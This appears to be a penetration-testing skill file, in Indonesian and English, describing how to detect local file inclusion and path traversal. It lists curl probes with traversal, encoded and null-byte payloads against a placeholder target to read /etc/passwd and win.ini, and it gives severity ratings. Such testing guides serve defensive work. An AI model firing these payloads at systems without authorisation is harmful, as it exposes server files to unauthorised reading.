---
name: ujiscan-vuln-lfi
description: "Local File Inclusion / path traversal — read server files. Use for file params, language, template, download. Triggers: lfi, path traversal, file inclusion, dot dot slash."
version: 1.0.0
phase: ["vulnscan"]
category: ["vulnscan"]
tools: ["curl", "ffuf", "gobuster"]
tags: ["vuln", "detection", "verification"]
---

# LFI Detection# LFI / Path Traversal Detection

## Langkah Pengujian

### 1. Temukan param file
`?file=`, `?page=`, `?lang=`, `?template=`, `?download=`, `?view=`

### 2. Probe traversal
```bash
curl -s "http://target/?page=../../../../../../etc/passwd"
curl -s "http://target/?page=....//....//....//etc/passwd"   # bypass filter "-"
curl -s "http://target/?page=..%2f..%2f..%2fetc%2fpasswd"    # encoded
curl -s "http://target/?page=/etc/passwd"                    # absolute

# Windows
curl -s "http://target/?page=..\..\..\windows\win.ini"
```

### 3. Null byte / extension bypass (legacy, PHP < 5.4)
`../../../../etc/passwd%00`

## Klasifikasi
- LFI + /etc/passwd readable: HIGH
- LFI + PHP wrapper (php://filter): HIGH-CRITICAL
- Traversal terbatas (satu dir): MEDIUM

## Verifikasi
1. Isi file aktual muncul (bukan error)
2. Re-run dengan casing/encode berbeda untuk reproducible
3. JANGAN baca file credential/private (password, .env) — cukup bukti traversal

